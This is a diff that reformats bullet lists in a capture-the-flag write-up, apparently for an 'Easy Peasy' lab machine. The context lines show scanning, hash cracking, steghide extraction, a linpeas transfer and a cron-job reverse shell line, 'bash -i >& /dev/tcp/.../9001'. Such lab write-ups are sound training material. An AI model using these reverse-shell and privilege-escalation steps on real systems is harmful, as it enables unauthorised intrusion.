@@ -32,9 +32,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1552.77 seconds
 
 * nmap -A -p- < ipaddress >
 
-*-A (Aggressive scan options)*
+* -A (Aggressive scan options)*
 
-*-p- (port ranges)*
+* -p- (port ranges)*
 
 What is the version of nginx?
 
@@ -75,7 +75,7 @@ Once I was on this page, I decided to view the sourcepages.
 
 * base64 -d < filename > to decode string
 
-*-d decode data*
+* -d decode data*
 
 "WALAH" there goes the first flag
 
@@ -158,13 +158,13 @@ using hashcat and the hint combo
 
 hashcat -a 0 -m 6900 <filename> easypeasy.txt **Must be run as sudo**
 
-*-a attack mode
+* -a attack mode
 
-*0 MD5
+* 0 MD5
 
-*-m hash type
+* -m hash type
 
-*6900 GOST R 34.11-94
+* 6900 GOST R 34.11-94
 ```
 sudo hashcat -a 0 -m 6900 hash.txt ~/Downloads/easypeasy.txt
 hashcat (v6.1.1) starting...
@@ -242,12 +242,6 @@ b---------------y.jpg  100%[====================================================
 └─$ steghide extract -sf binarycodepixabay.jpg -p m------------------b                                                                                                     
 wrote extracted data to "secrettext.txt".
 
-*extract Extracts data from file
-
-*-sf Outputs Filename
-
-*-p Sets passphrase
-
 ┌──(user㉿kali)-[~/Documents]
 └─$ls
 secrettext.txt
@@ -260,6 +254,12 @@ username:b----g
 password:
 01101001 01100011 0------1 01101110 01110110 01100101 0------0 01110100 0------1 01100100 01101101 0------1 01110000 01100001 01110011 0------1 01110111 01101111 0------0 01100100 01110100 0------1 01100010 01101001 0------0 01100001 01110010 01111001
 ```
+* extract Extracts data from file
+
+* -sf Outputs Filename
+
+* -p Sets passphrase
+
 
 What is the password to login to the machine via SSH?
 ```
@@ -314,12 +314,12 @@ python3 -m http.server #on host machine#
 python3 -m http.server                                                                                                                                
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 --.--.---.--- - - [08/Apr/2021 13:27:23] "GET /linpeas.sh HTTP/1.1" 200 -
-
-*Note in order for this to work you will need to be in the directory the file is in.
 ```
-*-m runs Modules
+* Note in order for this to work you will need to be in the directory the file is in.
 
-*http.server
+* -m runs Modules
+
+* http.server
 
 on the target machine I used
 
@@ -338,11 +338,11 @@ linpeas.sh                                               100%[==================
 
 Once this file is uploaded run a chmod +x linpeas.sh to make it executable
 
-*chmod +x linpeas.sh
+* chmod +x linpeas.sh
 
 Now that the file is an executable you can run it by using
 
-*./linpeas.sh
+* ./linpeas.sh
 
 After a nice wait (this would be a good time to get another cup of coffee)
 ```/etc/cron.monthly:
@@ -408,7 +408,7 @@ listening on [any] 9001 ...
 
 Now on the target machine let run the script
 
-*./.mysecretcronjob.sh
+* ./.mysecretcronjob.sh
 ```
 b----g@kral4-PC:/var/www$ ./.mysecretcronjob.sh
 bash -i >& /dev/tcp/--.-.---.--/9001 0>&1
@@ -416,7 +416,7 @@ bash -i >& /dev/tcp/--.-.---.--/9001 0>&1
 ./.mysecretcronjob.sh: connect: Connection refused
 ./.mysecretcronjob.sh: line 4: /dev/tcp/--.-.---.--/9001: Connection refused
 ./.mysecretcronjob.sh: line 4: 196: Bad file descriptor
-*Script came back with an error but the listener still pickup
+* Script came back with an error but the listener still pickup
 ```
 
 Listen established a connection
